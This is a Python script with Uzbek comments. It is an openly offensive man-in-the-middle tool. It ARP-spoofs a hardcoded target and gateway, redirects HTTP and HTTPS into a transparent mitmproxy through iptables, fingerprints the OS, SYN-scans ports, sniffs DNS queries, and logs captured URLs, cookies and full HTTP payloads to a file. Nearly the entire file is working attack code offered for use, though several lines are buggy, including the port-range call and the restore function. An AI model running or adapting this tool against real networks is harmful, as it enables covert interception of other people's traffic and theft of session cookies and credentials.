import datetime
import os
import subprocess
import sys
import threading
import time

import requests
from scapy.all import ARP, Ether, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR

# Ogohlantitishlarni o'chirish
conf.verb = 0
# Tarmoq sozlamalari
interface = "wlp0s20f3"
gateway_ip = "10.30.0.1"
target_ip = "10.50.0.1"
attacker_mac = "f8:b5:4d:40:59:07"
mitmproxy_port = 8080


# Ma'lumotlarni faylga yozish
def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {message}\n")


# ARP Spoofing function
def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing: {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)


# Tarmoq tiklash function
def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src=spoof_mac)
    arp = ARP(op=2, dst=target_mac, src=spoof_mac)
    packet = ether / arp
    sendp(packet, count=4, iface=interface)
    msg = f"Tiklash: {target_ip} -> {spoof_ip}"
    print(msg)
    log_to_file(msg)


# Maqsad va  gateway MAC manzillarini olish
def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None


# Spoofingni davom ettirish
def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing error: {e}"
        print(msg)
        log_to_file(msg)


# mitmproxy'ni subprocess sifatida ishga tushirish
def start_mitmproxy():
    msg = f"mitmproxy {mitmproxy_port} - portda ishga tushmoqda"
    print(msg)
    log_to_file(msg)
    mitmproxy_process = subprocess.Popen(
        ["mitmproxy", "--mode", "transparent", "--listen-port", str(mitmproxy_port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    return mitmproxy_process


# Trafikni mitmproxy'ga yo'naltirish uchun intables sozlash
def setup_intables():
    msg = "iptables sozlanmoqda..."
    print(msg)
    log_to_file(msg)
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")


# iptables'no tozalash
def cleanup_iptables():
    msg = "iptables tozalanmoqda..."
    print(msg)
    log_to_file(msg)
    os.system(f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system(
        f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-ports {mitmproxy_port}")
    os.system("sysctl -w net.ipv4.ip_forward=0")


# OS Fingerprinting
def os_fingerprint(target_ip):
    msg = f"OS fingerprinting boshlanmoqda: {target_ip}"
    print(msg)
    log_to_file(msg)
    packet = IP(dst=target_ip) / TCP(dport=80, flags="S")
    response = sr1(packet, timeout=2, verbose=0)
    if response:
        ttl = response[IP].ttl
        window_size = response[TCP].window
        if ttl <= 64:
            os_guess = "Linux/Unix yoki Android"
        elif ttl <= 128:
            os_guess = "Windows"
        elif ttl <= 255:
            os_guess = "IOS/MacOS yoki boshqa"
        else:
            os_guess = "Noma'lum"
        msg = f"Tahminiy OS: {os_guess} (TTL: {ttl}, Window Size: {window_size})"
    else:
        msg = "Javob olinmadi, OS aniqlanmadi."
    print(msg)
    log_to_file(msg)


# Ochik portlarni skanerlash
def scan_ports(target_ip, port_range=(1, 1000)):
    msg = f"Portlarni skanerlash: {target_ip}"
    print(msg)
    log_to_file(msg)
    open_ports = []
    for port in range(port_range[0], port_range(1) + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:  # SYN-ACK
            open_ports.append(port)
            sr1(IP(dst=target_ip) / TCP(dport=port, flags="R"), timeout=1, verbose=0)
    msg = f"Ochiq portlar: {open_ports}"
    print(msg)
    log_to_file(msg)


# DNS so'rovlarini ushlash
def sniff_dns():
    msg = "DNS so'rovlarini ushlash boshlandi..."
    print(msg)
    log_to_file(msg)

    def process_dns(packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # So'rov
            dns_query = packet[DNSQR].qname.decode("utf-8", errors="ignore")
            msg = f"DNS so'rov: {dns_query}"
            print(msg)
            log_to_file(msg)

    sniff(iface=interface, filter=f"udp port 53 and host {target_ip}", prn=process_dns, store=0)


# MAC manzil orqali vendor aniqlash
def get_vendor(mac):
    url = f"https://api.macvendors.com/{mac}"
    try:
        response = requests.get(url, timeout=5)
        if response.status == 200:
            return response.text
        else:
            return "Vendor aniqlanmadi"
    except:
        return "Internet ulanishi xatosi"


# Trafikni ushlash va analiz qilish (URL va qo'shimcha ma'lumotlar bilan)
def sniff_traffic():
    msg = "Trafikni ushlash boshlandi..."
    print(msg)
    log_to_file(msg)

    def process_packet(packet):
        summary = packet.summary()
        print(summary)
        log_to_file(summary)

        if packet.haslayer("IP"):
            src_ip = packet["IP"].src
            dst_ip = packet["IP"].dst
            if packet.haslayer("TCP"):
                src_port = packet["TCP"].sport
                dst_port = packet["TCP"].dport
                msg = f"Portlar: {src_ip}:{src_port} -> {dst_ip}:{dst_port}"
                print(msg)
                log_to_file(msg)
            if packet.haslayer("Raw"):
                payload = packet["Raw"].load
                try:
                    decoded = payload.decode("utf-8", errors="ignore")
                    if "HTTP" in decoded:
                        # HTTP so'rov toki  javobni aniqlash
                        lines = decoded.split("\r\n")
                        url = None
                        headers = {}
                        for line in lines:
                            if line.startswith("GET") or line.startswith("POST"):
                                parts = line.split(" ")
                                if len(parts) > 1:
                                    url = parts[1]  # URL olish
                            elif ": " in line:
                                key, value = line.split(": ", 1)
                                headers[key] = value

                        if url:
                            msg = f"URL: {url}"
                            print(msg)
                            log_to_file(msg)

                        # Qo'shimcha header'lar
                        if headers:
                            for key, value in headers.items():
                                if key in ["Host", "User-Agent", "Cookie", "Referer", "Content-type"]:
                                    msg = f"{key}: {value}"
                                    print(msg)
                                    log_to_file(msg)

                        # To'liq HTTP ma'lumot
                        msg = f"HTTP ma'lumot: {decoded}"
                        print(msg)
                        log_to_file(msg)
                    else:
                        msg = f"Shifrlangan yoki boshqa ma'lumot: {payload.hex()}"
                        print(msg)
                        log_to_file(msg)
                except:
                    msg = f"Dekod qilish bo'lmadi: {payload.hex()}"
                    print(msg)
                    log_to_file(msg)

    sniff(iface=interface, filter=f"host {target_ip}", prn=process_packet, store=0)


def main():
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        msg = "MAC manzillarni olishda xato! IP'lar to'g'ri ekanligini tekshiring."
        print(msg)
        log_to_file(msg)
        sys.exit(1)

    msg = f"Target MAC: {target_mac}"
    print(msg)
    log_to_file(msg)
    msg = f"Gateway MAC: {gateway_mac}"
    print(msg)
    log_to_file(msg)

    # Qo'shimcha ma'lumotlar
    vendor = get_vendor(target_mac)
    msg = f"Qurilma ishlab chiqaruvchisi: {vendor}"
    print(msg)
    log_to_file(msg)
    os_fingerprint(target_ip)
    scan_ports(target_ip, (1, 100))
    mitmproxy_process = start_mitmproxy()
    setup_intables()
    spoof_thread = threading.Thread(target=start_spoofing, args=(target_mac, gateway_mac))
    spoof_thread.daemon = True
    spoof_thread.start()
    dns_thread = threading.Thread(target=sniff_dns)
    dns_thread.daemon = True
    dns_thread.start()

    try:
        sniff_traffic()
    except KeyboardInterrupt:
        msg = "\nMITM to'xtatildi, tarmoq tiklanmoqda..."
        print(msg)
        log_to_file(msg)
        mitmproxy_process.terminate();
        cleanup_iptables()
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        msg = "Tarmoq tiklandi!"
        print(msg)
        log_to_file(msg)
        sys.exit(0)


if __name__ == "__main__":
    main()
